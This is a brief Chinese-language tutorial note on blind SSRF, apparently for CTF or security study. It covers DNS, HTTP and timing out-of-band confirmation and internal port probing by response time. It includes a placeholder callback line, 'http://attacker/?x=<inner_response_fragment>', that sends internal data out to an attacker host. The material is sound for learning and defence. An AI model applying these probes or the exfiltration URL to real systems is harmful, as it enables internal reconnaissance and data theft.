# Blind SSRF 与外带技巧

## Blind SSRF 核心问题
你看不到响应正文，怎么确认攻击成功？

## 三类观测通道
- DNS 外带：看是否有域名解析请求。
- HTTP 外带：看是否有回连请求。
- 时间外带：比较不同目标下请求耗时。

## 基础方法
1. 发送 `http://<随机子域>.your-dnslog`
2. 观察 DNSLog 是否收到解析。
3. 若收到，继续构造内网目标并用时间差判断端口。

## 时间差示例
- 开放端口：快速返回（连接成功/应用报错）
- 关闭端口：快速拒绝
- 过滤或黑洞：长时间超时

## 外带取数思路
某些题允许把内网返回内容拼接到回连 URL 参数中：
- `http://attacker/?x=<inner_response_fragment>`

是否可行取决于后端业务逻辑，不是 SSRF 默认能力。

## 防止误判
- 一次请求至少重复 2~3 次，排除网络抖动。
- 对照组必须有：可达地址 + 不可达地址。
